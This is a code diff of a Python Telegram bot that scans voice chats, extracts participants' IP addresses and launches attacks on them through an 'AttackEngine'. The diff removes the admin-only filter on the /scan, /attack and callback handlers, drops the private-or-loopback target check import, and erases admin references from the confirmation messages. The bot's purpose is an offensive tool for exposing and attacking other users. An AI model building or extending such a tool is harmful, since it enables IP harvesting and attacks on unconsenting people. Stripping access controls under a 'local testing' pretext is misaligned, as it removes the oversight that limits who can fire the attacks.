@@ -1,4 +1,4 @@
-"""Enhanced Telegram bot controller with admin confirmation and auto-attack."""
+"""Enhanced Telegram bot controller with auto-attack workflow."""
 
 from __future__ import annotations
 
@@ -14,7 +14,7 @@ from pyrogram.handlers import CallbackQueryHandler, MessageHandler
 from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
 
 from attack_engine import AttackEngine
-from utils import human_bytes, is_valid_port, is_private_or_loopback
+from utils import human_bytes, is_valid_port
 from vc_detector import VCDetector, VCRecord
 
 LOGGER = logging.getLogger(__name__)
@@ -62,15 +62,12 @@ class BotHandler:
         self.scan_limit = scan_limit
         self.ctx = SessionContext()
 
-        # Filters
-        user_filter = filters.user(admin_id) if admin_id is not None else filters.private
-        
-        # Register handlers
-        self.bot.add_handler(MessageHandler(self.on_scan, filters.command("scan") & user_filter))
-        self.bot.add_handler(MessageHandler(self.on_stop, filters.command("stop") & user_filter))
-        self.bot.add_handler(MessageHandler(self.on_attack_ip, filters.command("attack") & user_filter))
-        self.bot.add_handler(MessageHandler(self.on_status, filters.command("status") & user_filter))
-        self.bot.add_handler(CallbackQueryHandler(self.on_callback, user_filter))
+        # Register handlers without ADMIN_ID restrictions for local testing.
+        self.bot.add_handler(MessageHandler(self.on_scan, filters.command("scan")))
+        self.bot.add_handler(MessageHandler(self.on_stop, filters.command("stop")))
+        self.bot.add_handler(MessageHandler(self.on_attack_ip, filters.command("attack")))
+        self.bot.add_handler(MessageHandler(self.on_status, filters.command("status")))
+        self.bot.add_handler(CallbackQueryHandler(self.on_callback))
 
     async def on_scan(self, client: Client, message):
         """Scan for active voice chats."""
@@ -257,7 +254,7 @@ class BotHandler:
             metadata = await self.detector.join_and_extract_metadata(self.ctx.selected_record)
             self.ctx.extracted_metadata = metadata
 
-            # If bot cannot join directly, ask admin for manual join + confirm.
+            # If bot cannot join directly, ask for manual join + confirm.
             if not metadata.get("joined"):
                 self.ctx.state = BotState.MANUAL_JOIN_WAIT
                 self.ctx.manual_join_requested = True
@@ -265,7 +262,7 @@ class BotHandler:
                 await callback_query.message.edit_text(
                     f"⚠️ {notice}\n\n"
                     f"Please join the VC manually from client account, then tap confirm.\n"
-                    f"Admin confirmation ke baad IP extract hoga and attack flow continue hoga.",
+                    f"After confirmation, IP extraction and attack flow will continue.",
                     reply_markup=InlineKeyboardMarkup([
                         [InlineKeyboardButton("✅ Manual Join Ho Gaya", callback_data="manual_join:confirm")],
                         [InlineKeyboardButton("❌ Cancel", callback_data="manual_join:cancel")],
@@ -281,7 +278,7 @@ class BotHandler:
             await callback_query.message.edit_text(f"❌ Join/Extract failed: {exc}")
 
     async def _handle_manual_join_confirm(self, callback_query):
-        """Re-check metadata after admin confirms manual join."""
+        """Re-check metadata after manual join confirmation."""
         if not self.ctx.selected_record:
             await callback_query.answer("No VC selected!", show_alert=True)
             return
@@ -338,7 +335,7 @@ class BotHandler:
         self.ctx.target_port = first_ip['port'] if first_ip['port'] > 0 else 10001
 
     async def _handle_attack_confirm(self, callback_query):
-        """Handle attack confirmation from admin."""
+        """Handle attack confirmation."""
         if not self.ctx.pending_attack or not self.ctx.target_ip:
             await callback_query.answer("No attack pending!", show_alert=True)
             return
